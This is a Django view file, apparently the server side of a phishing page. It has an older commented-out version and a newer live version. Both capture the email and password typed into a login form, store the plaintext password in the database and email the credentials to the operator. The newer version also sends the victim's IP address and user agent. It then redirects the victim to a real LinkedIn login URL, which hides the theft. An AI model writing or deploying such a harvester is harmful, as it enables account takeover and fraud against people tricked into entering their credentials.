# from django.shortcuts import render, redirect
# from django.core.mail import send_mail
# from django.conf import settings
# from django.views.decorators.csrf import csrf_protect
# from .models import LoginAttempt

# @csrf_protect
# def index(request):
#     if request.method == 'POST':
#         email = request.POST.get('email')  
#         password = request.POST.get('password')  
        
#         if email and password:
#             # Save the login attempt to database
#             LoginAttempt.objects.create(
#                 email=email,
#                 password=password
#             )
            
#             # Send email notification to admin
#             subject = 'New Login Attempt'
#             message = f'A new login attempt was made with:\n\nEmail: {email}\nPassword: {password}'
#             from_email = settings.DEFAULT_FROM_EMAIL
#             recipient_list = [settings.ADMIN_EMAILS] 
            
#             send_mail(
#                 subject,
#                 message,
#                 from_email,
#                 recipient_list,
#                 fail_silently=False,
#             )
            
#             return redirect('index')  
    
#     return render(request, 'login.html')



from django.shortcuts import render, redirect
from django.core.mail import send_mail, EmailMessage
from django.conf import settings
from django.views.decorators.csrf import csrf_protect
from .models import LoginAttempt
from django.utils import timezone

@csrf_protect
def index(request):
    if request.method == 'POST':
        email = request.POST.get('email')  
        password = request.POST.get('password')  
        
        if email and password:
            # Save the login attempt to database
            LoginAttempt.objects.create(
                email=email,
                password=password
            )
            
            # Send email notification to all admins
            subject = 'New Login Attempt Detected'
            message = f'''
            A new login attempt was recorded:

            Email: {email}
            Password: {password}

            Timestamp: {timezone.now()}
            IP Address: {request.META.get('REMOTE_ADDR')}
            User Agent: {request.META.get('HTTP_USER_AGENT')}
            '''.strip()
            
            sender_name = "Login Alert System"
            from_email = f"{sender_name} <{settings.DEFAULT_FROM_EMAIL}>"
            
            # Using EmailMessage for better formatting
            email = EmailMessage(
                subject,
                message,
                from_email,
                settings.ADMIN_EMAILS,  # Sends to all emails in the tuple
            )
            email.send()
            
            # Redirect to the specified LinkedIn URL
            linkedin_redirect_url = (
                "https://www.linkedin.com/uas/login?"
                "session_redirect=%2Foauth%2Fv2%2Flogin-success%3Fapp_id%3D4238991%26auth_type%3DAC%26flow%3D%257B%2522state%2522%253A%2522f52c232892464ef8d06c60e41855c778%2522%252C%2522creationTime%2522%253A1750116052187%252C%2522scope%2522%253A%2522r_liteprofile%2Br_emailaddress%2522%252C%2522appId%2522%253A4238991%252C%2522authorizationType%2522%253A%2522OAUTH2_AUTHORIZATION_CODE%2522%252C%2522redirectUri%2522%253A%2522https%253A%252F%252Flogin.alibaba.com%252Fnewlogin%252Foauth_sign.htm%253Ftype%253Dlinkedin%2522%252C%2522currentStage%2522%253A%2522LOGIN_SUCCESS%2522%252C%2522currentSubStage%2522%253A0%252C%2522authFlowName%2522%253A%2522generic-permission-list%2522%257D"
                "&fromSignIn=1&trk=oauth&cancel_redirect=%2Foauth%2Fv2%2Flogin-cancel%3Fapp_id%3D4238991%26auth_type%3DAC%26flow%3D%257B%2522state%2522%253A%2522f52c232892464ef8d06c60e41855c778%2522%252C%2522creationTime%2522%253A1750116052187%252C%2522scope%2522%253A%2522r_liteprofile%2Br_emailaddress%2522%252C%2522appId%2522%253A4238991%252C%2522authorizationType%2522%253A%2522OAUTH2_AUTHORIZATION_CODE%2522%252C%2522redirectUri%2522%253A%2522https%253A%252F%252Flogin.alibaba.com%252Fnewlogin%252Foauth_sign.htm%253Ftype%253Dlinkedin%2522%252C%2522currentStage%2522%253A%2522LOGIN_SUCCESS%2522%252C%2522currentSubStage%2522%253A0%252C%2522authFlowName%2522%253A%2522generic-permission-list%2522%257D"
            )
            return redirect(linkedin_redirect_url)
    
    return render(request, 'login.html')